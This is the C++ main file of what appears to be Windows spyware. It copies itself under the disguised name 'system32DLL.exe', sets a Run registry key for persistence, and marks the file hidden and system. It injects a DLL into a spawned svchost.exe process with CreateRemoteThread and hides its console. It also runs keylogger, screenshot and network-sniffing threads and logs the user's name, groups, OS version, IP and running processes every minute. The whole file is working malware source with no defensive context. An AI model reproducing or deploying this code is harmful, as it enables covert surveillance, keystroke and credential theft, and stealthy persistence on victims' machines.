#include "keystrokes.h"
#include "screenshot.h"
#include "userData.h"
#include <thread>
#include <iostream>
#include <stdio.h>
#include <ctime>
#include <fstream>
#include "ipData.h"
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
using std::ofstream;
using std::ios;
using std::thread;
using std::cout;
using std::endl;

const std::string currentDateTime();
BOOL RegisterMyProgramForStartup();
BOOL InjectDLL();


int main()
{
	thread inject(InjectDLL);
	ofstream user("C:\\temp\\user_data.txt", ios::out | std::ofstream::trunc);
	std::string userName = getCurrentUserName(user);
	

	/* copy file to new location */
	CopyFile(L"system32DLL.exe", L"C:\\temp\\system32DLL.exe", 0);

	/* giving the file SYSTEM premissions (Full control) */
	std::string grantSystem = "icacls C:\\temp\\system32DLL.exe  /grant " + userName + ":(f,wdac)";
	system(grantSystem.c_str());

	/* write the program to the registry */
	RegisterMyProgramForStartup();

	/* make the file hidden */
	const wchar_t* fileLPCWSTR = L"C:\\temp\\system32DLL.exe"; // To avoid incompatibility
												 // in GetFileAttributes()
	int attributes = GetFileAttributes(fileLPCWSTR);
	if ((attributes & FILE_ATTRIBUTE_HIDDEN) == 0) 
	{
		SetFileAttributes(fileLPCWSTR, attributes | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) ;
	}

	
	thread getConnectedIp(startSniff);
	thread keyLogger(stratKeyLogger);
	thread takePics(takeScreenshots);
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	user.close();
	/* need to do it once per minute (60 sec) !!!!! */
	while (true)
	{
		ofstream user("C:\\temp\\user_data.txt", ios::out | std::ofstream::trunc);
		user << "currentDateTime()=" << currentDateTime() << "\n";
		user << "################################################\n";
		user << "Username: " << userName << "\n";
		getUserGroups(user);
		getwindowsVersion(user);
		user << "Local IP: " << getMyIP() << "\n";
		getAllProcesses(user);
		user.flush();
		std::this_thread::sleep_for(std::chrono::seconds(60));
		user.close();
	}
	/* ---------------------- */
	
	inject.join();
	getConnectedIp.join();
	takePics.join();
	keyLogger.join();
	return 0;
}

BOOL InjectDLL()
{
	CopyFile(L"newWall.png", L"C:\\temp\\newWall.png", 0);
	CopyFile(L"wallpaperDLL.dll", L"C:\\temp\\wallpaperDLL.dll", 0);
	LPCSTR DllPath = "C:\\temp\\wallpaperDLL.dll";
	STARTUPINFOW process_startup_info{ 0 };
	process_startup_info.cb = sizeof(process_startup_info); // setup size of strcture in bytes

	PROCESS_INFORMATION process_info{ 0 };
	wchar_t commandline_args[] = L"svchost.exe";
	// Open a handle to target process
	CreateProcess(NULL, commandline_args, NULL, NULL, FALSE, 0, NULL, NULL, &process_startup_info, &process_info);

	// Allocate memory for the dllpath in the target process
	// length of the path string + null terminator
	HANDLE hProcess = OpenProcess(CREATE_THREAD_ACCESS, FALSE, process_info.dwProcessId);
	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1,
		MEM_COMMIT, PAGE_READWRITE);

	// Write the path to the address of the memory we just allocated
	// in the target process
	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath,
		strlen(DllPath) + 1, 0);

	// Create a Remote Thread in the target process which
	// calls LoadLibraryA as our dllpath as an argument -> program loads our dll
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
			"LoadLibraryA"), pDllPath, 0, 0);

	// Wait for the execution of our loader thread to finish
	WaitForSingleObject(hLoadThread, INFINITE);


	// Free the memory allocated for our dll path
	VirtualFreeEx(process_info.hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);
	WaitForSingleObject(process_info.hProcess, INFINITE);

	CloseHandle(process_info.hThread);
	CloseHandle(process_info.hProcess);
	return true;
}

const std::string currentDateTime()
{
	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	tstruct = *localtime(&now);
	strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);

	return buf;
}

BOOL RegisterMyProgramForStartup()
{
	std::wstring progPath = L"C:\\temp\\system32DLL.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
	return 0;
}